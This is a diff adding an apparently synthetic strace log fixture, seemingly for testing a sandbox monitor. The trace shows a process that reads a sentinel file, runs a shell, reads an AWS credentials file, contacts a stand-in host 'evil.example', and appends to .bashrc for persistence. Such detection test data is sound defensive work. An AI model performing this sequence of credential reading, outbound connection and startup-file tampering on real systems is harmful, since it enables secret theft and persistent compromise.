@@ -1,0 +1,15 @@
+1000 1700000000.100000 openat(AT_FDCWD, "/aegis/sentinels/MARKER123", O_RDONLY) = 3</aegis/sentinels/MARKER123> <0.000050>
+1000 1700000000.110000 execve("/bin/sh", ["sh", "-c", "id"], 0x7ffd00000000 /* 20 vars */) = 0 <0.000200>
+1000 1700000000.120000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f0000000000) = 1001 <0.000100>
+1001 1700000000.130000 execve("/usr/bin/id", ["id"], 0x55e000000000 /* 20 vars */) = 0 <0.000150>
+1000 1700000000.140000 openat(AT_FDCWD, "/home/sandbox/.aws/credentials", O_RDONLY) = 4</home/sandbox/.aws/credentials> <0.000040>
+1000 1700000000.150000 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 5<TCP:[]> <0.000030>
+1000 1700000000.160000 connect(5<TCP:[127.0.0.1:40000]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("127.10.0.5")}, 16) = 0 <0.000500>
+1000 1700000000.170000 sendto(5<TCP:[127.0.0.1:40000->127.10.0.5:80]>, "GET / HTTP/1.1\r\nHost: evil.example\r\n\r\n", 37, MSG_NOSIGNAL, NULL, 0) = 37 <0.000200>
+1000 1700000000.180000 connect(6<TCP:[127.0.0.1:40002]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16 <unfinished ...>
+1000 1700000000.280000 <... connect resumed>) = -1 ECONNREFUSED (Connection refused) <0.100000>
+1000 1700000000.290000 openat(AT_FDCWD, "/home/sandbox/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0644) = 7</home/sandbox/.bashrc> <0.000060>
+1000 1700000000.300000 chmod("/home/sandbox/.bashrc", 0755) = 0 <0.000020>
+1001 1700000000.310000 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1001, si_status=0} ---
+1001 1700000000.320000 +++ exited with 0 +++
+1000 1700000000.330000 +++ exited with 0 +++
